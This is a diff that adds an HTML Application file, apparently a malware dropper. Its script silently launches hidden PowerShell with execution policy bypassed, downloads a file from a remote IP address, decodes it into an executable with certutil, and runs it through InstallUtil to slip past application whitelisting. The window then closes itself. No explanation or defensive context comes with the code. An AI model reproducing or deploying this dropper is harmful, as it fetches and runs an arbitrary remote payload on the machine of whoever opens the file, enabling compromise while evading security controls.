@@ -1,0 +1,18 @@
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var cmd = "cmd.exe /c powershell -w hidden -nop -ep bypass -c \""
+    + "Invoke-WebRequest -Uri 'http://192.168.45.164/payload.txt' -OutFile $env:TEMP\\encoded.txt; "
+    + "certutil -decode $env:TEMP\\encoded.txt $env:TEMP\\runner.exe; "
+    + "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U $env:TEMP\\runner.exe\"";
+
+shell.Run(cmd, 0);
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
